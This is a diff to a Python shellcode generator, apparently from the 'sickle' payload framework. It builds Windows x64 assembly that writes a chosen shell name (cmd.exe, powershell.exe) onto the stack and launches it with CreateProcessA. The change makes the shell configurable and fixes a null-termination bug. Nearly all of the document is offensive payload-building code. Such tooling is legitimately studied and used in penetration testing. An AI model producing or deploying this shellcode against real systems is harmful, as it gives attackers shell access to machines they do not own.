@@ -15,9 +15,6 @@ from sickle.common.headers.windows import (
     processthreadsapi
 )
 
-# TODO: Make register saving optional, switch between shell envs (powershell, cmd.exe)
-# SHELL ENV CHANGE: NOT DONE
-
 class Shellcode():
 
     arch = "x64"
@@ -58,7 +55,7 @@ class Shellcode():
 
     arguments["SHELL"] = {}
     arguments["SHELL"]["optional"] = "yes"
-    arguments["SHELL"]["description"] = "Shell environment"
+    arguments["SHELL"]["description"] = "Shell environment (powershell.exe, cmd.exe, etc)"
 
     advanced = {}
     advanced["OP_AS_FUNC"] = {}
@@ -119,7 +116,7 @@ class Shellcode():
             self.shell = argv_dict["SHELL"]
 
         # Be sure to NULL terminate the shell environment used
-        self.shell = "\x00"
+        self.shell += "\x00"
         while (len(self.shell) % 8) != 0:
             self.shell += "\x00"
 
@@ -247,14 +244,37 @@ init_STARTUPINFOA:
 ;                       [in, optional]      LPCSTR                lpCurrentDirectory,    // RSP+0x38 => NULL
 ;                       [in]                LPSTARTUPINFOA        lpStartupInfo,         // RSP+0x40 => &lpStartupInfo
 ;                       [out]               LPPROCESS_INFORMATION lpProcessInformation); // RSP+0x48 => &lpStartupInfo
-call_CreateProccessA:
-    xor ecx, ecx
-    mov rdx, rbp
-    lea rdx, [rbp - {self.storage_offsets['lpCommandLine']}]
-    xor rax, rax
-    mov eax, 0x646d63
-    mov [rdx], rax
-    xor r8, r8
+call_CreateProccessA:\n"""
+
+
+        cmd_buffer = convert.from_str_to_xwords(self.shell)
+        write_index = self.storage_offsets['lpCommandLine']
+
+        for i in range(len(cmd_buffer["QWORD_LIST"])):
+            shellcode += "    mov rcx, 0x{}\n".format( struct.pack('<Q', cmd_buffer["QWORD_LIST"][i]).hex() )
+            shellcode += "    mov [rbp-{}], rcx\n".format(hex(write_index))
+            write_index -= 8
+
+        for i in range(len(cmd_buffer["DWORD_LIST"])):
+            shellcode += "    mov ecx, 0x{}\n".format( struct.pack('<L', cmd_buffer["DWORD_LIST"][i]).hex() )
+            shellcode += "    mov [rbp-{}], ecx\n".format(hex(write_index))
+            write_index -= 4
+
+        for i in range(len(cmd_buffer["WORD_LIST"])):
+            shellcode += "    mov cx, 0x{}\n".format( struct.pack('<H', cmd_buffer["WORD_LIST"][i]).hex() )
+            shellcode += "    mov [rbp-{}], cx\n".format(hex(write_index))
+            write_index -= 2
+
+        for i in range(len(cmd_buffer["BYTE_LIST"])):
+            shellcode += "    mov cl, {}\n".format( hex(cmd_buffer["BYTE_LIST"][i]) )
+            shellcode += "    mov [rbp-{}], cl\n".format(hex(write_index))
+            write_index -= 1
+
+        shellcode += f"""    xor rcx, rcx
+    mov [rbp - {write_index}], cl
+    lea rdx, [rbp - {self.storage_offsets['lpCommandLine']}]\n"""
+
+        shellcode += f"""    xor r8, r8
     xor r9, r9
     xor eax, eax
     inc eax
@@ -267,9 +287,7 @@ call_CreateProccessA:
     lea rbx, [rbp - {self.storage_offsets['lpProcessInformation']}]
     mov [rsp + 0x48], rbx
     mov rax, [rbp - {self.storage_offsets['CreateProcessA']}]
-    call rax
-
-"""
+    call rax\n"""
 
         shellcode += win_stubs.get_epilogue()
 
